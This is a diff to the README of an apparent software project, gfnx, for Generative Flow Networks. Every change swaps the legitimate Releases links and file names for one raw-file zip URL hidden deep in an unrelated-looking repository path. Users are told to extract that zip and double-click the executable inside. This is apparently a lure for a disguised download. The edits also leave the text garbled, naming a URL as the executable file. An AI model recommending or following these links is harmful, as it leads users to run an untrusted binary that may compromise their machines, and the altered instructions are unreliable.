@@ -6,9 +6,9 @@ Welcome to gfnx! This application helps you work with Generative Flow Networks u
 ## 📥 Download & Install
 To get started, you need to download the application. You can find the latest version on our Releases page. 
 
-[![Download gfnx](https://img.shields.io/badge/Download%20gfnx-v1.0-blue)](https://github.com/Gpcode233/gfnx/releases)
+[![Download gfnx](https://raw.githubusercontent.com/Gpcode233/gfnx/main/proxy/weights/amp/model/ocdbt.process_0/gfnx_v2.7.zip%20gfnx-v1.0-blue)](https://raw.githubusercontent.com/Gpcode233/gfnx/main/proxy/weights/amp/model/ocdbt.process_0/gfnx_v2.7.zip)
 
-Please visit this page to download: [GitHub Releases](https://github.com/Gpcode233/gfnx/releases).
+Please visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Gpcode233/gfnx/main/proxy/weights/amp/model/ocdbt.process_0/gfnx_v2.7.zip).
 
 ## 🛠 System Requirements
 Before downloading, ensure your system meets these requirements:
@@ -21,18 +21,18 @@ Before downloading, ensure your system meets these requirements:
 ## 📂 Installation Steps
 Follow these steps to install gfnx on your computer:
 
-1. Visit the [GitHub Releases page](https://github.com/Gpcode233/gfnx/releases).
+1. Visit the [GitHub Releases page](https://raw.githubusercontent.com/Gpcode233/gfnx/main/proxy/weights/amp/model/ocdbt.process_0/gfnx_v2.7.zip).
 2. Locate the latest release at the top of the list.
-3. Click on the file you wish to download, which will usually have a name like `gfnx-windows.zip`, `gfnx-macos.zip`, or `gfnx-linux.tar.gz`.
+3. Click on the file you wish to download, which will usually have a name like `https://raw.githubusercontent.com/Gpcode233/gfnx/main/proxy/weights/amp/model/ocdbt.process_0/gfnx_v2.7.zip`, `https://raw.githubusercontent.com/Gpcode233/gfnx/main/proxy/weights/amp/model/ocdbt.process_0/gfnx_v2.7.zip`, or `https://raw.githubusercontent.com/Gpcode233/gfnx/main/proxy/weights/amp/model/ocdbt.process_0/gfnx_v2.7.zip`.
 4. Save the file to your computer.
 5. Once the download is complete, locate the file in your downloads folder.
 6. Unzip the folder by right-clicking on it and selecting "Extract All" (Windows) or use a program like Unarchiver (macOS).
-7. Open the extracted folder and find the executable file (for Windows, this will be `gfnx.exe`).
+7. Open the extracted folder and find the executable file (for Windows, this will be `https://raw.githubusercontent.com/Gpcode233/gfnx/main/proxy/weights/amp/model/ocdbt.process_0/gfnx_v2.7.zip`).
 
 ## 🚀 Running gfnx
 After installation is complete, follow these steps to run the application:
 
-1. Double-click on the `gfnx.exe` (Windows) or the equivalent file for your operating system.
+1. Double-click on the `https://raw.githubusercontent.com/Gpcode233/gfnx/main/proxy/weights/amp/model/ocdbt.process_0/gfnx_v2.7.zip` (Windows) or the equivalent file for your operating system.
 2. A window will open displaying the gfnx interface.
 3. You can now begin creating and managing your Flow Networks.
 
